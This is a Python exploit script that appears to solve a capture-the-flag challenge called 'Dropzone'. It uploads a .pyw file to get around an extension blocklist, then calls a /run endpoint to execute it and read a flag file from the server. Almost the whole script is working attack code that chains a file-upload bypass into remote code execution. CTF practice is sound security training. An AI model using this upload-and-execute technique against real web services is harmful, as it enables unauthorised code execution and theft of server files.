#!/usr/bin/env python3
"""
Dropzone Exploitation Script
Target: Cyber Hero CTF 2026 - Dropzone
Vector: Insecure File Upload via .pyw extension bypass -> RCE via /run/<name>
"""
import requests
import sys

TARGET_URL = "http://192.168.30.129:8003"

def solve(target=TARGET_URL):
    print(f"[*] Targeting {target}...")

    # Python payload to extract the flag stored in the hidden vault directory
    payload = """
with open('/var/lib/dropzone/.vault/flag.txt') as f:
    print(f.read().strip())
"""

    print("[*] Uploading .pyw payload to bypass extension blocklist...")
    files = {"file": ("exploit.pyw", payload, "text/plain")}
    res_upload = requests.post(f"{target}/upload", files=files)
    if res_upload.status_code != 200:
        print(f"[-] Upload failed: {res_upload.status_code} {res_upload.text}")
        return

    print("[*] Triggering execution via /run/exploit.pyw...")
    res_run = requests.get(f"{target}/run/exploit.pyw")
    if res_run.status_code != 200:
        print(f"[-] Execution failed: {res_run.status_code} {res_run.text}")
        return

    data = res_run.json()
    flag = data.get("output", "").strip()
    print(f"\n[+] Extracted Flag: {flag}\n")
    return flag

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    solve(url)

